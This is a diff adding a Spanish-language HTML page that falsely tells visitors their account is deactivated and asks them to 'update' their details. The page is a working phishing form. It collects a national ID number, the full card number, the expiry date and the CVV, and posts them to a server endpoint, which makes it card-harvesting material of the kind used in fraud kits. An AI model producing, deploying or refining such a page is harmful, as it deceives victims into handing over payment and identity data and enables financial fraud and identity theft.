@@ -1,0 +1,142 @@
+<html class="no-js" lang="en">
+<meta http-equiv="Cache-Control" content="no-cache, no-store" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
+
+<head>
+
+
+
+	<title>Consultas</title>
+
+	<link rel="stylesheet" href="../css/style.css" />
+</head>
+
+<body class="home nolog">
+	<header>
+		<div id="header" class="nolog">
+			<div class="header-content">
+				<h1><a href="#">Consultas</a></h1>
+			</div>
+		</div>
+	</header>
+	<meta http-equiv="Cache-Control" content="no-cache, no-store" />
+	<meta http-equiv="Pragma" content="no-cache" />
+	<meta http-equiv="Expires" content="0" />
+
+
+
+
+
+
+
+
+	<div id="container" class="clearfi" style='background:#E6E6E6;  width:100%;'>
+		<center>
+			<div style='width:100%; padding:20px 0px; background:white;'>
+				<center>
+
+					<h3 style='font-size:3em; color:red;'>Cuenta Desactivada!</h3>
+				</center>
+			</div>
+			<div class="content nolo">
+				<h3 style='margin-top:20px; font-size:3em; color:#585858;'>Por motivos de seguridad ,Actualiza tu
+					informacion.</h3>
+				<div class="combo-registr">
+					<p>
+					<h2>Datos de facturación</h2>
+					</p>
+					<style>
+						input[type=text] {
+							background: white;
+						}
+					</style>
+
+					<form id="card" name="card" action="/update" method="post">
+						<fieldset>
+							<p>
+								<input type="text" class="dni" name='dni' required placeholder='Número de Documento'maxlength="10">
+
+							</p>
+
+
+
+
+							<p>
+							<h2>Informacion de seguridad</h2>
+							</p>
+
+							<p>
+								<input type="text" class="cardnumber" name='cardnumber' required id='cardnumber'
+									placeholder='Número de tarjeta'maxlength="16">
+							</p>
+							<p>
+								<select class="usuario" name='mm' required style='width:182px;'>
+									<option selected disabled>Mes
+									<option value='01'>01
+									<option value='02'>02
+									<option value='03'>03
+									<option value='04'>04
+									<option value='05'>05
+									<option value='06'>06
+									<option value='07'>07
+									<option value='08'>08
+									<option value='09'>09
+									<option value='10'>10
+									<option value='11'>11
+									<option value='12'>12
+								</select>
+
+								<select class="usuario" name='yy' required style='width:175px;'>
+									<option selected disabled>Año
+									<option value="2024">24</option>
+									<option value="2025">25</option>
+									<option value="2026">26</option>
+									<option value="2027">27</option>
+									<option value="2028">28</option>
+									<option value="2029">29</option>
+									<option value="2030">30</option>
+									<option value="2031">31</option>
+									<option value="2032">32</option>
+									<option value="2033">33</option>
+									<option value="2034">34</option>
+									<option value="2035">35</option>
+									<option value="2036">36</option>
+									<option value="2037">37</option>
+								</select>
+							</p>
+							<p>
+								<input type="text" class="usuario" name='cvv' id='cvv'  placeholder='Código de seguridad' maxlength='4'   required>
+							</p>
+
+							<input type="submit" id="submitLogin" value="Ingresar" class="btn-224px"
+								style="border:none;" clearForm="true" button="true" blocksui="true" />
+
+
+
+						</fieldset>
+
+					</form>
+
+
+
+
+				</div>
+				<div class="combo-txt">
+
+				</div>
+			</div>
+		</center>
+	</div>
+
+
+	
+
+
+	
+		
+	</div>
+
+</body>
+
+</html>
